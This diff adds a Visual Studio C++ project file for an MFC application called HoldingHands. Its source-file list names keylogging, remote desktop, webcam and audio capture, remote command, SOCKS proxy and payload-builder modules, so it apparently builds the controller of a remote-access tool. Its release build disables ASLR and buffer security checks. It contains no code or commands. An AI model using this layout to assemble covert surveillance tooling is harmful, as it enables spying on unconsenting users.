@@ -1,0 +1,257 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project DefaultTargets="Build" ToolsVersion="12.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <ItemGroup Label="ProjectConfigurations">
+    <ProjectConfiguration Include="Debug|Win32">
+      <Configuration>Debug</Configuration>
+      <Platform>Win32</Platform>
+    </ProjectConfiguration>
+    <ProjectConfiguration Include="Release|Win32">
+      <Configuration>Release</Configuration>
+      <Platform>Win32</Platform>
+    </ProjectConfiguration>
+  </ItemGroup>
+  <PropertyGroup Label="Globals">
+    <ProjectGuid>{D52104AC-4999-4C66-9462-65296407040E}</ProjectGuid>
+    <RootNamespace>HoldingHands</RootNamespace>
+    <Keyword>MFCProj</Keyword>
+  </PropertyGroup>
+  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
+    <ConfigurationType>Application</ConfigurationType>
+    <UseDebugLibraries>true</UseDebugLibraries>
+    <PlatformToolset>v120_xp</PlatformToolset>
+    <CharacterSet>Unicode</CharacterSet>
+    <UseOfMfc>Static</UseOfMfc>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
+    <ConfigurationType>Application</ConfigurationType>
+    <UseDebugLibraries>false</UseDebugLibraries>
+    <PlatformToolset>v120_xp</PlatformToolset>
+    <WholeProgramOptimization>true</WholeProgramOptimization>
+    <CharacterSet>Unicode</CharacterSet>
+    <UseOfMfc>Static</UseOfMfc>
+  </PropertyGroup>
+  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
+  <ImportGroup Label="ExtensionSettings">
+  </ImportGroup>
+  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
+    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
+  </ImportGroup>
+  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
+    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
+  </ImportGroup>
+  <PropertyGroup Label="UserMacros" />
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
+    <LinkIncremental>true</LinkIncremental>
+    <IncludePath>libyuv\include;ffmpeg\include;$(IncludePath);..\..\Common;.\;</IncludePath>
+    <LibraryPath>ffmpeg\lib;libyuv\lib;$(LibraryPath)</LibraryPath>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
+    <LinkIncremental>false</LinkIncremental>
+    <IncludePath>libyuv\include;ffmpeg\include;$(IncludePath);..\..\Client\Common;..\..\Common</IncludePath>
+    <LibraryPath>libyuv\lib;ffmpeg\lib;$(LibraryPath)</LibraryPath>
+  </PropertyGroup>
+  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
+    <ClCompile>
+      <PrecompiledHeader>Use</PrecompiledHeader>
+      <WarningLevel>Level3</WarningLevel>
+      <Optimization>Disabled</Optimization>
+      <PreprocessorDefinitions>WIN32;_WINDOWS;_DEBUG;%(PreprocessorDefinitions);_HOLDINGHANDS_</PreprocessorDefinitions>
+      <RuntimeLibrary>MultiThreadedDebug</RuntimeLibrary>
+    </ClCompile>
+    <Link>
+      <SubSystem>Windows</SubSystem>
+      <GenerateDebugInformation>true</GenerateDebugInformation>
+      <IgnoreSpecificDefaultLibraries>libcmt.lib</IgnoreSpecificDefaultLibraries>
+      <RandomizedBaseAddress>false</RandomizedBaseAddress>
+      <EntryPointSymbol>
+      </EntryPointSymbol>
+    </Link>
+    <Midl>
+      <MkTypLibCompatible>false</MkTypLibCompatible>
+      <ValidateAllParameters>true</ValidateAllParameters>
+      <PreprocessorDefinitions>_DEBUG;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+    </Midl>
+    <ResourceCompile>
+      <Culture>0x0804</Culture>
+      <PreprocessorDefinitions>_DEBUG;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+      <AdditionalIncludeDirectories>$(IntDir);%(AdditionalIncludeDirectories)</AdditionalIncludeDirectories>
+    </ResourceCompile>
+  </ItemDefinitionGroup>
+  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
+    <ClCompile>
+      <WarningLevel>Level3</WarningLevel>
+      <PrecompiledHeader>Use</PrecompiledHeader>
+      <Optimization>MaxSpeed</Optimization>
+      <FunctionLevelLinking>true</FunctionLevelLinking>
+      <IntrinsicFunctions>true</IntrinsicFunctions>
+      <PreprocessorDefinitions>WIN32;_WINDOWS;NDEBUG;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+      <RuntimeLibrary>MultiThreaded</RuntimeLibrary>
+      <BufferSecurityCheck>false</BufferSecurityCheck>
+    </ClCompile>
+    <Link>
+      <SubSystem>Windows</SubSystem>
+      <GenerateDebugInformation>true</GenerateDebugInformation>
+      <EnableCOMDATFolding>true</EnableCOMDATFolding>
+      <OptimizeReferences>true</OptimizeReferences>
+      <IgnoreSpecificDefaultLibraries>
+      </IgnoreSpecificDefaultLibraries>
+      <RandomizedBaseAddress>false</RandomizedBaseAddress>
+    </Link>
+    <Midl>
+      <MkTypLibCompatible>false</MkTypLibCompatible>
+      <ValidateAllParameters>true</ValidateAllParameters>
+      <PreprocessorDefinitions>NDEBUG;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+    </Midl>
+    <ResourceCompile>
+      <Culture>0x0804</Culture>
+      <PreprocessorDefinitions>NDEBUG;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+      <AdditionalIncludeDirectories>$(IntDir);%(AdditionalIncludeDirectories)</AdditionalIncludeDirectories>
+    </ResourceCompile>
+  </ItemDefinitionGroup>
+  <ItemGroup>
+    <Text Include="ReadMe.txt" />
+  </ItemGroup>
+  <ItemGroup>
+    <ClInclude Include="..\..\common\EventHandler.h" />
+    <ClInclude Include="..\..\common\IOCPSocket.h" />
+    <ClInclude Include="..\..\common\list.h" />
+    <ClInclude Include="..\..\common\spinlock.h" />
+    <ClInclude Include="AudioDlg.h" />
+    <ClInclude Include="AudioGrab.h" />
+    <ClInclude Include="AudioPlay.h" />
+    <ClInclude Include="AudioSrv.h" />
+    <ClInclude Include="BuildDlg.h" />
+    <ClInclude Include="CameraSrv.h" />
+    <ClInclude Include="CameraWnd.h" />
+    <ClInclude Include="ChatDlg.h" />
+    <ClInclude Include="ChatInputName.h" />
+    <ClInclude Include="ChatSrv.h" />
+    <ClInclude Include="Client.h" />
+    <ClInclude Include="ClientList.h" />
+    <ClInclude Include="CmdEdit.h" />
+    <ClInclude Include="CmdSrv.h" />
+    <ClInclude Include="CmdWnd.h" />
+    <ClInclude Include="Config.h" />
+    <ClInclude Include="EditCommentDlg.h" />
+    <ClInclude Include="FileManagerDlg.h" />
+    <ClInclude Include="FileManagerSrv.h" />
+    <ClInclude Include="FileMgrSearchDlg.h" />
+    <ClInclude Include="FileMgrSearchSrv.h" />
+    <ClInclude Include="FileSelectDlg.h" />
+    <ClInclude Include="HoldingHands.h" />
+    <ClInclude Include="KernelSrv.h" />
+    <ClInclude Include="KeybdLogDlg.h" />
+    <ClInclude Include="KeybdLogSrv.h" />
+    <ClInclude Include="MainFrm.h" />
+    <ClInclude Include="FileDownloadDlg.h" />
+    <ClInclude Include="FileDownloadSrv.h" />
+    <ClInclude Include="FileTransDlg.h" />
+    <ClInclude Include="FileTransSrv.h" />
+    <ClInclude Include="ProcessManagerSrv.h" />
+    <ClInclude Include="ProcessManagerWnd.h" />
+    <ClInclude Include="RemoteDesktopSrv.h" />
+    <ClInclude Include="RemoteDesktopWnd.h" />
+    <ClInclude Include="Resource.h" />
+    <ClInclude Include="RingBuffer.h" />
+    <ClInclude Include="Server.h" />
+    <ClInclude Include="SettingDlg.h" />
+    <ClInclude Include="SocksProxyAddrDlg.h" />
+    <ClInclude Include="SocksProxyTcp.h" />
+    <ClInclude Include="SocksProxyListener.h" />
+    <ClInclude Include="SocksProxySrv.h" />
+    <ClInclude Include="SocksProxyUDPListener.h" />
+    <ClInclude Include="SocksProxyWnd.h" />
+    <ClInclude Include="stdafx.h" />
+    <ClInclude Include="targetver.h" />
+    <ClInclude Include="UrlInputDlg.h" />
+  </ItemGroup>
+  <ItemGroup>
+    <ClCompile Include="..\..\common\dbg.cpp" />
+    <ClCompile Include="..\..\common\EventHandler.cpp" />
+    <ClCompile Include="..\..\common\IOCP.cpp" />
+    <ClCompile Include="..\..\common\TCPSocket.cpp" />
+    <ClCompile Include="..\..\common\UDPSocket.cpp" />
+    <ClCompile Include="..\..\common\utils.cpp" />
+    <ClCompile Include="AudioDlg.cpp" />
+    <ClCompile Include="AudioGrab.cpp" />
+    <ClCompile Include="AudioPlay.cpp" />
+    <ClCompile Include="AudioSrv.cpp" />
+    <ClCompile Include="BuildDlg.cpp" />
+    <ClCompile Include="CameraSrv.cpp" />
+    <ClCompile Include="CameraWnd.cpp" />
+    <ClCompile Include="ChatDlg.cpp" />
+    <ClCompile Include="ChatInputName.cpp" />
+    <ClCompile Include="ChatSrv.cpp" />
+    <ClCompile Include="Client.cpp" />
+    <ClCompile Include="ClientList.cpp" />
+    <ClCompile Include="CmdEdit.cpp" />
+    <ClCompile Include="CmdSrv.cpp" />
+    <ClCompile Include="CmdWnd.cpp" />
+    <ClCompile Include="Config.cpp" />
+    <ClCompile Include="EditCommentDlg.cpp" />
+    <ClCompile Include="FileManagerDlg.cpp" />
+    <ClCompile Include="FileManagerSrv.cpp" />
+    <ClCompile Include="FileMgrSearchDlg.cpp" />
+    <ClCompile Include="FileMgrSearchSrv.cpp" />
+    <ClCompile Include="FileSelectDlg.cpp" />
+    <ClCompile Include="HoldingHands.cpp" />
+    <ClCompile Include="KernelSrv.cpp" />
+    <ClCompile Include="KeybdLogDlg.cpp" />
+    <ClCompile Include="KeybdLogSrv.cpp" />
+    <ClCompile Include="main.cpp" />
+    <ClCompile Include="MainFrm.cpp" />
+    <ClCompile Include="FileDownloadDlg.cpp" />
+    <ClCompile Include="FileDownloadSrv.cpp" />
+    <ClCompile Include="FileTransDlg.cpp" />
+    <ClCompile Include="FileTransSrv.cpp" />
+    <ClCompile Include="ProcessManagerSrv.cpp" />
+    <ClCompile Include="ProcessManagerWnd.cpp" />
+    <ClCompile Include="RemoteDesktopSrv.cpp" />
+    <ClCompile Include="RemoteDesktopWnd.cpp" />
+    <ClCompile Include="RingBuffer.cpp" />
+    <ClCompile Include="Server.cpp" />
+    <ClCompile Include="SettingDlg.cpp" />
+    <ClCompile Include="SocksProxyAddrDlg.cpp" />
+    <ClCompile Include="SocksProxyTcp.cpp" />
+    <ClCompile Include="SocksProxyListener.cpp" />
+    <ClCompile Include="SocksProxySrv.cpp" />
+    <ClCompile Include="SocksProxyUDPListener.cpp" />
+    <ClCompile Include="SocksProxyWnd.cpp" />
+    <ClCompile Include="stdafx.cpp">
+      <PrecompiledHeader Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">Create</PrecompiledHeader>
+      <PrecompiledHeader Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">Create</PrecompiledHeader>
+    </ClCompile>
+    <ClCompile Include="UrlInputDlg.cpp" />
+  </ItemGroup>
+  <ItemGroup>
+    <ResourceCompile Include="HoldingHands.rc" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="res\HoldingHands.rc2" />
+  </ItemGroup>
+  <ItemGroup>
+    <Image Include="res\del.ico" />
+    <Image Include="res\go.ico" />
+    <Image Include="res\HoldingHands.ico" />
+    <Image Include="res\icon1.ico" />
+    <Image Include="res\NewFolder.bmp" />
+    <Image Include="res\newfolder.ico" />
+    <Image Include="res\refresh.ico" />
+    <Image Include="res\search.bmp" />
+    <Image Include="res\search.ico" />
+    <Image Include="res\toolbar1.bmp" />
+    <Image Include="res\up.bmp" />
+    <Image Include="res\up.ico" />
+    <Image Include="res\view.bmp" />
+    <Image Include="res\view.ico" />
+  </ItemGroup>
+  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
+  <ImportGroup Label="ExtensionTargets">
+  </ImportGroup>
+  <ProjectExtensions>
+    <VisualStudio>
+      <UserProperties RESOURCE_FILE="HoldingHands.rc" />
+    </VisualStudio>
+  </ProjectExtensions>
+</Project>
